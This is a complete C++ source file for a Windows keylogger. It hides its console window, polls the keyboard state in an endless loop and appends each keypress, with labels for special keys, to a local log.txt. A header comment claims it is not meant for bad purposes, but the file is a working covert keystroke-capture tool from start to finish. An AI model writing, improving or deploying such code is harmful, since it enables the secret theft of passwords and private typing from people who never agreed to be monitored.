/*
This code is not programmed for bad purpose
*/

/* 
   "fopen is insecure please use fopen_s" if you get this issues from file operation part , go to
	Project >> YourConsoleApplication Properties >> C/C++ >> Preprocessor >> Preprocessor Definitions
	and copy paste this code in this below

   _CRT_SECURE_NO_WARNINGS; _WIN32; _DEBUG; _CONSOLE; _LIB% 
 
 */

#include <iostream>
#include <Windows.h>


using namespace std;

int Save(int _key, char *file);

int main()
{
	FreeConsole();
	char i;
	while (true)
	{
		Sleep(10);
		for (i = 8; i < 255; i++)
		{
			/*GetAsyncKeyState = Determines whether a key is up or down at the time the function is called, 
			and whether the key was pressed after a previous call to GetAsyncKeyState.*/
			if (GetAsyncKeyState(i) == -32767)
			{
				Save(i, "log.txt");
			}
		}
	}
}

int Save(int _key, char *file)
{
	cout << _key << endl;
	Sleep(10);

	FILE *OUTPUT_FILE;

	OUTPUT_FILE = fopen(file, "a+");
	if (_key == VK_SHIFT)
	{
		fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
	}
	else if (_key == VK_BACK)
	{
		fprintf(OUTPUT_FILE, "%s", "[BACK]");
	}
	else if (_key == VK_LBUTTON)
	{
		fprintf(OUTPUT_FILE, "%s", "[LBUTTON]");
	}
	else if (_key == VK_RETURN)
	{
		fprintf(OUTPUT_FILE, "%s", "[RETURN]");
	}
	else if (_key == VK_ESCAPE)
	{
		fprintf(OUTPUT_FILE, "%s", "[ESCAPE]");
	}

	else if (_key == VK_CAPITAL)
	{
		fprintf(OUTPUT_FILE, "%s", "[CAPITAL]");
	}

	else if (_key == VK_SPACE)
	{
		fprintf(OUTPUT_FILE, "%s", "[SPACE]");
	}

	else if (_key == VK_NUMPAD0)
	{
		fprintf(OUTPUT_FILE, "%s", "[0]");
	}

	else if (_key == VK_NUMPAD1)
	{
		fprintf(OUTPUT_FILE, "%s", "[1]");
	}
	else if (_key == VK_NUMPAD2)
	{
		fprintf(OUTPUT_FILE, "%s", "[2]");
	}
	else if (_key == VK_NUMPAD3)
	{
		fprintf(OUTPUT_FILE, "%s", "[3]");
	}
	else if (_key == VK_NUMPAD4)
	{
		fprintf(OUTPUT_FILE, "%s", "[4]");
	}

	else if (_key == VK_NUMPAD5)
	{
		fprintf(OUTPUT_FILE, "%s", "[5]");
	}
	else if (_key == VK_NUMPAD6)
	{
		fprintf(OUTPUT_FILE, "%s", "[6]");
	}
	else if (_key == VK_NUMPAD7)
	{
		fprintf(OUTPUT_FILE, "%s", "[7]");
	}
	else if (_key == VK_NUMPAD8)
	{
		fprintf(OUTPUT_FILE, "%s", "[8]");
	}
	else if (_key == VK_NUMPAD9)
	{
		fprintf(OUTPUT_FILE, "%s", "[9]");

	}

	fprintf(OUTPUT_FILE, "%s", &_key);
	fclose(OUTPUT_FILE);

	return 0;
}

